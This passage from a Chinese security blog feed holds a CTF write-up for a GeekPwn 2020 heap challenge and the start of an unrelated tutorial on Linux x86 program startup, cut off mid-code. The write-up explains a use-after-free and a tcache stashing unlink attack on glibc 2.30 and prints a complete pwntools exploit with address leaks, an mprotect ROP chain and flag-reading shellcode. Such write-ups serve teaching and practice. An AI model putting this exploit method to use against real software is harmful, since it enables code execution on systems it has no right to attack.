src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/20200726210831.png" alt="图片无法显示，请联系作者" title=" "><p>程序提供了<code>6</code>中操作。（<code>plt</code>表错误，可以用<code>cutter</code>识别）</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/20200726203521.png" alt="图片无法显示，请联系作者" title=" "><p><code>buy</code>函数中使用<code>calloc</code>分配限定大小范围内的堆块。分配次数无限制但是只能存储<code>5</code>个堆块指针，保存在全局变量中<code>0x5080</code>中。<code>throw</code>函数释放堆块，但是没有将堆块指针置为空，存在<code>UAF</code>。<code>show_dance</code>则是输出函数。<code>change</code>改变堆块中存储的内容。若<code>0x10000</code>存储的内容不为<code>0x42</code>，则<code>input_secret</code>用来向<code>0x100008</code>地址处写入用户输入的数据，而<code>call_global</code>则调用<code>0x100010</code>处保存的函数指针，以<code>0x100018</code>处为参数。</p><p>由于<code>libc</code>版本为<code>2.30</code>存在<code>tcache</code>，而<code>calloc</code>分配是不经过<code>tcache</code>的，因此无法直接对<code>tcache</code>进行攻击。这里是用到的是<code>tcache small bin attack(tcache stashing unlink attack)</code>。即当请求的大小位于<code>small bin</code>范围中时，若相应大小的<code>tcache</code>未满，则将剩余的<code>small bin</code>放入到<code>tcache</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">  idx = smallbin_index (nb);</span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">      set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">         &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = tc_victim-&gt;bk;</span><br><span class="line">          set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena (tc_victim);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tcache</code>堆块的放入操作从<code>small bin</code>链表的尾部开始。因此如果我们修改了<code>small bin</code>表头指向的堆块的<code>bk</code>指针，就可以向<code>*(bk+0x10)</code>的地址处写入一个<code>main_arean</code>附近的地址。</p><p>这里我们可以将<code>tcache</code>提前填充到<code>6</code>，这样放入一块堆块之后就不会再放入了，也就解决了地址错误的导致的崩溃问题。</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><ul><li><p>首先将大小为<code>0x160</code>的<code>tcache</code>填满，大小为<code>0xa0</code>的<code>tcache</code>剩余一个位置。</p></li><li><p>此时申请<code>0x160</code>大小的堆块，再次释放则会进入<code>small bin</code>。由于我们需要两个<code>small bin</code>堆块。因此执行下列操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">buy(<span class="number">0</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">buy(<span class="number">2</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">buy(<span class="number">3</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">throw_bas(<span class="number">0</span>) <span class="comment">#释放堆块进入unsorted bin大小为0x160</span></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># 泄露libc地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;the dance:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0xb0</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># 0x160大小的堆块被分割，unsorted bin中剩余0xa0大小的堆块</span></span><br><span class="line"></span><br><span class="line">throw_bas(<span class="number">2</span>)  <span class="comment"># 释放0x160大小的堆块，fd指针指向0xa0大小的堆块，可以泄露堆地址</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;the dance:&quot;</span>)</span><br><span class="line">heap_address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0xb0</span>, <span class="string">&quot;0&quot;</span>) <span class="comment">#0x160大小的堆块被分割，unsorted bin中剩余0xa0大小的堆块，另一个0xa0大小的堆块进入small bin</span></span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0xb0</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># unsorted bin中大小为0xa0的堆块（高地址，链表头部）进入small bin</span></span><br><span class="line"><span class="comment"># 修改位于链表头部的0xa0堆块的bk指针，指向0x100000-0x10的位置</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0</span>)*<span class="built_in">int</span>(<span class="number">0xb0</span>/<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(heap_address) + p64(<span class="number">0x100000</span>-<span class="number">0x10</span>))</span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&quot;0&quot;</span>)<span class="comment"># 链表尾部的0xa0大小的堆块被申请，链表头部的0xa0堆块放入tcache，0x100000被写入main_arean+240的地址</span></span><br></pre></td></tr></table></figure><p>这样我们就将可以调用<code>input_secret</code>和<code>call_global</code>函数实现任意代码执行了。</p></li><li><p>这里采用的是调用<code>puts</code>函数利用<code>environ</code>变量泄露栈地址，修改<code>puts</code>执行完毕之后的返回地址，利用<code>gadget</code>调用<code>mprotect</code>函数关闭<code>0x100000</code>地址的不可执行保护，劫持函数栈到<code>0x100000</code>实现<code>orw</code>的调用。</p><blockquote><p>也可以使用mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28];此类的通过rdi 控制rbp，并实现call调用的gadget。将call调用设置为leave，ret实现栈迁移，调用orw，gadget链。</p></blockquote></li></ul><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x55555555591D\n&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.30/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size of basketball:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;name:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">throw_bas</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx of basketball:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx of basketball:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx of basketball:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;dance of the basketball:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_secret</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Input the secret place:&quot;</span>, secret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_global</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0x666</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    buy(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    throw_bas(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    buy(<span class="number">0</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    throw_bas(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;filled tcache&quot;</span>)</span><br><span class="line">buy(<span class="number">0</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">buy(<span class="number">2</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">buy(<span class="number">3</span>, <span class="number">0x150</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">throw_bas(<span class="number">0</span>) <span class="comment"># unsorted 0x150</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;the dance:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0xb0</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># unsorted 0xa0</span></span><br><span class="line"></span><br><span class="line">throw_bas(<span class="number">2</span>)  <span class="comment"># to unsorted bin  0x160&lt;-&gt;0xa0</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;the dance:&quot;</span>)</span><br><span class="line">heap_address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0xb0</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># unsorted 0xa0, smallbin 0xa0</span></span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0xb0</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0</span>)*<span class="built_in">int</span>(<span class="number">0xb0</span>/<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(heap_address) + p64(<span class="number">0x100000</span>-<span class="number">0x10</span>))</span><br><span class="line">buy(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_secret(p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;puts&#x27;</span>]) + p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>]))</span><br><span class="line">call_global()</span><br><span class="line">stack_address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - (<span class="number">0x7fffffffdf38</span> - <span class="number">0x7fffffffde28</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_address)))</span><br><span class="line"></span><br><span class="line">orw = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">orw += shellcraft.read(<span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">orw += shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) + p64(stack_address) + p64(<span class="number">0x100000</span> + <span class="number">0x28</span>) + asm(orw)</span><br><span class="line">input_secret(payload1)</span><br><span class="line">call_global()</span><br><span class="line"></span><br><span class="line">p_rdx_r12_r = libc.address + <span class="number">0xf7fb1</span></span><br><span class="line">p_rdi_r = libc.address + <span class="number">0x267e2</span></span><br><span class="line">p_rsi_r = libc.address + <span class="number">0x26d07</span></span><br><span class="line">p_rsp_r = libc.address + <span class="number">0x26f8b</span></span><br><span class="line">mprotect_address = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = flat([</span><br><span class="line">    p_rdi_r, <span class="number">0x100000</span>,</span><br><span class="line">    p_rsi_r, <span class="number">0x1000</span>,</span><br><span class="line">    p_rdx_r12_r, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">    mprotect_address,</span><br><span class="line">    p_rsp_r, <span class="number">0x100000</span>+<span class="number">0x20</span></span><br><span class="line">])</span><br><span class="line">raw_input()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LinuxX86程序启动-main函数执行</title>
      <link href="/posts/2085258898.html"/>
      <url>/posts/2085258898.html</url>
      
        <content type="html"><![CDATA[<h2 id="调用过程分析"><a href="#调用过程分析" class="headerlink" title="调用过程分析"></a>调用过程分析</h2><p>首先我们编一个简单的<code>main</code>函数，函数主体为空</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译完成之后，我们需要知道程序第一个调用的函数是什么，查看<code>ELF</code>文件的头部<code>objdump -f mainAna</code></p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020114342.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>可以看到可执行文件的起始地址是<code>0x80482e0</code>，也就是函数第一个调用的是<code>0x80482e0</code>处存储的函数，那么这个可执行文件的起始地址是如何得到的呢，我们知道每一个<code>elf</code>文件都具有一个头部，头部格式的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT]; <span class="comment">/* Magic number and other info */</span></span><br><span class="line">    Elf32_Half e_type; <span class="comment">/* Object file type */</span></span><br><span class="line">    Elf32_Half e_machine; <span class="comment">/* Architecture */</span></span><br><span class="line">    Elf32_Word e_version; <span class="comment">/* Object file version */</span></span><br><span class="line">    Elf32_Addr e_entry; <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">    Elf32_Off e_phoff; <span class="comment">/* Program header table file offset */</span></span><br><span class="line">    Elf32_Off e_shoff; <span class="comment">/* Section header table file offset */</span></span><br><span class="line">    Elf32_Word e_flags; <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">    Elf32_Half e_ehsize; <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">    Elf32_Half e_phentsize; <span class="comment">/* Program header table entry size */</span></span><br><span class="line">    Elf32_Half e_phnum; <span class="comment">/* Program header table entry count */</span></span><br><span class="line">    Elf32_Half e_shentsize; <span class="comment">/* Section header table entry size */</span></span><br><span class="line">    Elf32_Half e_shnum; <span class="comment">/* Section header table entry count */</span></span><br><span class="line">    Elf32_Half e_shstrndx; <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>其中<code>e_entry</code>表示的就是可执行文件的起始地址，我们可以通过<code>readelf -h mainAna</code>获取更加详细的信息</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020114418.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>那么我们接下来看一下这个地址的函数是什么</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020114559.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>也就是说程序一开始调用的是<code>_start</code>函数</p><h3 id="start函数分析"><a href="#start函数分析" class="headerlink" title="_start函数分析"></a>_start函数分析</h3><p>在<code>linux</code>中启动一个程序的时候，<code>shell</code>或者<code>gui</code>就会调用<code>execve()</code>函数，该函数就会调用系统调用<code>execve</code>，函数会为进程分配新的地址空间，将<code>argc,argv</code>和环境变量数组压入栈中。解析可执行文件，完成重定位，并将代码数据等映射如内存，设置完毕之后就会将控制权交给程序的入口函数也就是<code>_start</code>函数。我们看一下函数的代码</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020114623.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>在执行<code>_start</code>函数之前，目前函数栈帧的排列如下</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020114700.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>从上面的启动分析我们可以知道栈顶的元素就是<code>argc(0xffffcf40)</code>，其次是<code>argv(0xffffcf44)</code>和环境变量数组<code>(0x0xffffcf4c-start_end)</code>。其中<code>argv</code>与环境变量数组中间相隔一个<code>NULL</code>。</p><p>函数首先执行的是<code>xor ebp,ebp</code>这是将<code>ebp</code>清零，表示该函数是程序的最外层函数。接着是<code>pop esi</code>，将<code>esi</code>赋值为了<code>argc</code>的数值，然后是<code>mov ecx,esp</code>将<code>ecx</code>指向了<code>argv</code>的起始地址。然后是<code>and esp,0xfffffff0</code>这是将<code>esp</code>进行栈对齐。随后进行了一连串的<code>push</code>操作，这是在为调用<code>__libc_start_main</code>函数进行参数准备</p><h3 id="libc-start-main"><a href="#libc-start-main" class="headerlink" title="__libc_start_main"></a>__libc_start_main</h3><h4 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h4><p>我们首先看一下当前的寄存器中存储的值</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020142349.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>接着对<code>push</code>的参数进行分析。首先<code>push eax</code>，此时<code>eax</code>中保存的是无效的数值，<code>push</code>进入栈中的操作仅仅是为了栈<code>16</code>字节对齐。我们看一下<code>__libc_start_main</code>的函数调用，函数源代码位于<code>csu/libc-start.c</code>文件中。这里<code>auxvec</code>的值在后面会分析到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="type">int</span></span><br><span class="line">    <span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> argc, 